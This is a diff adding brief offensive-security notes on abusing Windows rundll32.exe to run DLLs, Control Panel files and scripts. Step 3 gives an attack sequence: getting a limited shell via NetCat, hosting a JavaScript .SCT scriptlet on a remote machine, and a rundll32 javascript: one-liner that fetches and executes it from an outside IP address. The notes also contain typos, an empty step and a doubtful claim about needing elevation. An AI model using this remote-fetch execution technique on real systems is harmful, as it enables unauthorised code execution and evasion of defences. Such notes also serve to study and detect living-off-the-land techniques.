@@ -1,0 +1,26 @@
+Description:
+1.	Loads and runs 32-bit dynamic-link libraries (DLLs)
+2.	You must run the rundll32 command from an elevated command prompt
+3.	The rundll32.exe program can be called to execute an arbitrary binary
+4.	Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser
+5.	Rundll32 can also been used to execute scripts such as JavaScript. 
+Syntax:
+	Rundll32 <DLLname>
+
+
+
+Step:
+1->			Executing Binary via Rundll32:
+
+
+2->			Executing CPL via Rundll32:
+Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser.
+
+Command:
+	rundll32.exe shell32.dll,Control_RunDLL file.cpl
+
+3 ->		Executing Scrip via Rundll32:
+1.	Using NetCat Get Limited Shell
+2.	Write a .SCT script with javascript, store script file on remote server
+3.	Run Following Command from shell/Command Line Window
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.1.105:1234/rundll.sct").Exec();""
